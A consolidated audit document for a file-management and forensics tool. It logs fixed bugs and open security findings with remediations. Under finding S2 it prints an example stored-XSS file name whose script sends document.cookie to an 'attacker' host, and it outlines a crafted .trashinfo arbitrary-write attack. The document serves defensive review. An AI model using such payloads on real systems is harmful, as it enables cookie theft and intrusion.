# Audit Findings — Bugs, Security & Forensic Hardening

**Date:** 2026-07-10 · **Updated:** 2026-07-11
**Consolidates** the old `01_CODE_REVIEW_AND_BUGS.md` + `02_SECURITY_AND_FORENSIC_AUDIT.md` into one file. No information was removed — this is a merge, not a rewrite.

---

## Part 1 — Code Correctness Bugs

> **Status:** every correctness finding below has been **fixed**. 254 tests pass. Kept as a changelog with file/line pointers — not open work.

### Severity legend

| Severity | Meaning |
| --- | --- |
| 🔴 High | Broken behaviour, data-loss risk, or false product claims. |
| 🟠 Medium | Real defect under realistic conditions (bad input, concurrency, edge case). |
| 🟡 Low | Correctness smell, hygiene, or robustness gap; low blast radius. |

### 🔴 Fixed — HIGH

- **H1** — `tests/test_comprehensive.py` imported `rename_with_regex`, which didn't exist → pytest failed at collection (only 77/~224 tests ran). Restored `rename_with_regex` in `core/operations/files.py` (thin wrapper over `rename_path` + `re.sub`) and fixed 3 other stale tests.

### 🟠 Fixed — MEDIUM

- **M1** — `fm hash-calc --algo sha512` crashed (`KeyError` in CLI). `core/hasher.py` now supports `sha512`/`blake2b`.
- **M2** — `IntegrityMonitor.verify_snapshot` crashed on truncated snapshot (`JSONDecodeError` not caught). Now catches `(OSError, json.JSONDecodeError)`.
- **M3** — `scanner.py` followed symlinks by default (recursion DoS + scope escape). Now skips symlinks with `follow_symlinks=False`.
- **M4** — Integrity hashing hardcoded MD5 regardless of config. `create_snapshot`/`verify_snapshot` now read `hash_algorithm` from config and write self-describing snapshots, with legacy flat-MD5 snapshots still readable.
- **M5** — Shared SQLite cache had no locking → `database is locked` under concurrent `BackgroundWorker` threads. Now wraps every method in `threading.Lock` + `PRAGMA journal_mode=WAL`.
- **M6** — Duplicate detection deleted on hash equality alone (default was MD5). Config default now `sha256`; `select_duplicate_records(verify_content=True)` byte-compares each non-keeper.

### 🟡 Fixed — LOW

- **L1** — Bare `except:` in filters/media actions silently coerced bad input to `0`. Now catches `(ValueError, TypeError)`.
- **L2** — `media_ops.py` / `plugin_loader.py` used `print()` for errors. Now use `logger.error(...)`.
- **L3** — `convert_image` had no-op `except Exception as e: raise e`. Now catches `(OSError, ValueError)`, logs, re-raises.
- **L4** — `modules/metadata.py` shelled out to `exiftool -ver` at import time. Probe is now `@lru_cache`d and lazy.
- **L5** — `render_template_name` used naive `str.replace` on template tokens. Now via `string.Formatter().vformat`.
- **L6** — `requirements.txt` mixed runtime and dev deps. Split into `requirements.txt` (runtime) + `requirements-dev.txt`.
- **L7** — Stray empty `26.1.2` file deleted; root `.gitignore` added.
- **L8** — Windows Recycle Bin scan silently returned `[]`. Now raises `TrashScanUnsupported`, surfaced in CLI and GUI.
- **L9** — `_run_john_dictionary` always reported `success: True`. Now derives from return code.

### Cross-cutting architecture concerns

*Moved to [`IMPROVEMENT_PLAN.md`](./IMPROVEMENT_PLAN.md) §Engineering Improvements.* These are structural overlaps (two filter engines, two metadata cleaners, dead `LocalProvider`) that aren't bugs per se but create correctness risk — the improvement plan tracks them as Phase 2 architecture items.

---

## Part 2 — Security & Forensic Findings

**Reviewer role:** Application security engineer / digital-forensics practitioner.
**Threat framing:** This app both *(a)* operates on untrusted data and *(b)* performs privileged/destructive actions. That combination is what makes its security posture matter.

> **Positive baseline:** No shell injection surface (all `subprocess` calls use argv list; no `shell=True`, `eval`, `exec`, `pickle`, `yaml.load`). Safe-delete-by-default (trash via `send2trash`). Preview → confirm → execute pattern. Cancellation tokens exist.

### Findings index

| ID | Severity | Title | Status |
| --- | --- | --- | --- |
| S1 | 🔴 High | MD5 used for integrity/tamper-evidence and as dedup default | ✅ Fixed |
| S2 | 🔴 High | Forensic HTML report is vulnerable to stored HTML/JS injection (XSS) | ⏳ Open |
| S3 | 🟠 Medium | Symlink-following scan → scope escape, TOCTOU, recursion DoS | ✅ Fixed |
| S4 | 🟠 Medium | `restore_from_trash` trusts attacker-controllable `.trashinfo` path → arbitrary write | ⏳ Open |
| S5 | 🟠 Medium | Plugin loader executes arbitrary local Python with full app privileges | ⏳ Open |
| S6 | 🟠 Medium | `secure_delete` gives false assurance (SSD/CoW) and falls back to trash | ⏳ Open |
| S7 | 🟠 Medium | System Cleanup classifies whole system/temp dirs as "junk" | ⏳ Open |
| S8 | 🟠 Medium | Sensitive credential material handled with weak hygiene | ⏳ Open |
| S9 | 🟡 Low | XML parsing without hardening (`recently-used.xbel`) — entity-expansion DoS | ⏳ Open |
| S10 | 🟡 Low | No config validation; blind merge of `~/.dataforge/config.json` | ⏳ Open |
| S11 | 🟡 Low | Opening scanned files via system handler (`xdg-open`/`startfile`) | ⏳ Open |
| S12 | 🟡 Low | Forensic outputs/reports written with default (often world-readable) permissions | ⏳ Open |
| S13 | 🟡 Low | Decompression-bomb exposure in image/PDF handling | ⏳ Open |

### ✅ S1 — MD5 as the integrity and de-duplication digest *(Fixed)*
Config default `hash_algorithm` is now `sha256`; `IntegrityMonitor` reads from config and writes self-describing snapshots; duplicate deletion byte-verifies each group.

### 🔴 S2 — Stored HTML/JS injection in the forensic HTML report *(Open)*
- **Where:** `modules/forensics.py:577-621` (`_forensic_report_html`).
- Attacker-influenced strings (`username`, `home`, `shell`, `filename`) are concatenated into HTML with **no escaping**.
- **Risk:** an evidence artefact named `"><script>fetch('//attacker/'+document.cookie)</script>.jpg` becomes live script when opened in a browser — stored XSS in examiner context. Disqualifying for court-grade output.
- **Fix:** HTML-escape every interpolated value (`html.escape(str(v))`). Add regression test with `<script>`-laden input.

### ✅ S3 — Symlink-following scan *(Fixed)*
`scan_directory` now skips symlinks with `follow_symlinks=False` everywhere (see M3 above).

### 🟠 S4 — Trash restore trusts attacker-controllable metadata → arbitrary file write *(Open)*
- **Where:** `modules/recovery.py:191-254`.
- `original_path` from `.trashinfo` is used directly as `shutil.move` destination, with `os.makedirs` creating parent dirs. USB stick with crafted `.trashinfo` can write attacker files to arbitrary writable paths.
- **Fix:** reject absolute paths outside a sane restore root; block `..` traversal; never auto-`makedirs` system paths; default to a user-chosen "Recovered" folder.

### 🟠 S5 — Plugin loader executes arbitrary local Python *(Open)*
- **Where:** `ui/plugin_loader.py:37-52`.
- Any `.py` in the plugins dir is imported in-process with full privileges — no signing, manifest, sandbox.
- **Fix:** document trust boundary; load from per-user dir with checked permissions; opt-in flag; log every plugin load.

### 🟠 S6 — `secure_delete` overstates its guarantee *(Open)*
- **Where:** `modules/forensics.py:906-939`.
- Overwrite-in-place doesn't work on SSDs/flash, CoW filesystems, or journaled FS. Falls back to `send2trash` on unlink failure — moving the file you asked to *destroy* into the trash.
- **Fix:** rename to "best-effort overwrite"; remove trash fallback; document media caveats.

### 🟠 S7 — System Cleanup treats entire system/temp trees as deletable "junk" *(Open)*
- **Where:** `modules/system_cleanup.py:180-263`.
- Any file under System Temp / User Cache / Thumbnails / Trash / Crash Reports is blanket-classified junk; user-supplied paths inherit this. Active `/tmp` content, Unix sockets, lock files can be deleted.
- **Fix:** never blanket-classify user paths; minimum-age filter for `/tmp`/`/var/tmp`; skip sockets/FIFOs; allow-list safe subtrees.

### 🟠 S8 — Sensitive credential material handled with weak hygiene *(Open)*
- **Where:** `modules/password_tools.py`.
- Cracked hashes/plaintext passwords written to world-readable `/tmp` files; password first-2-chars leaked in strength display.
- **Fix:** write with `0600`; never log cracked secrets; mask passwords fully; delete temp hash files after use.

### 🟡 S9–S13 — Low severity *(All open)*
- **S9** — Unhardened XML parsing in `forensics.py` (billion-laughs DoS). Fix: `defusedxml`.
- **S10** — No config validation; blind merge of `config.json`. Fix: validate types/ranges/enums on load.
- **S11** — Opening untrusted scanned files via OS default handler. Fix: confirm for executables, prefer "reveal in folder".
- **S12** — Forensic outputs written with default permissions (world-readable). Fix: `0600` for forensic artefacts.
- **S13** — Decompression-bomb exposure in Pillow/PDF parsing. Fix: `MAX_IMAGE_PIXELS` policy, cap PDF page counts.

---

## Forensic-soundness checklist

| Expectation | Status | Action |
| --- | --- | --- |
| Read-only evidence handling | ⚠️ Partial | Carving/parsing read-only; add explicit "read-only evidence" mode. |
| Authoritative hashing (SHA-256) | ✅ | Default is SHA-256 (S1 fixed); every manifest uses config's algorithm. |
| Report integrity / non-repudiation | ❌ | Reports plain files, world-readable (S12), HTML-injectable (S2). Escape output, hash reports, restrict perms. |
| Deterministic, timezone-aware timestamps | ⚠️ Partial | Timeline uses UTC; report uses naive/local. Standardise on UTC ISO-8601. |
| Chain-of-custody / audit log | ❌ | No tamper-evident action log. Add append-only audit trail for evidence ops. |
| Tool/version + input provenance in reports | ⚠️ Partial | Add tool version, host, operator, and input hashes. |
| Hostile-input hardening | ❌/⚠️ | S2, S9, S13, S3 above. |

## Recommended remediation order

1. **S2** (report XSS) — directly undermines forensic value proposition; cheap to fix.
2. **S4 / S7** — highest real-world blast radius (arbitrary write, blanket data loss).
3. **S5 / S6 / S8** — code-exec surface, false-security control, secret hygiene.
4. **S9–S13** — hardening batchable with linting/dependency work from the roadmap.

Each finding is actionable in isolation. The architecture (centralised `FileActionService`, single scanner, preview/confirm) is the right place to enforce these controls once — fixing at the seam is high-leverage.
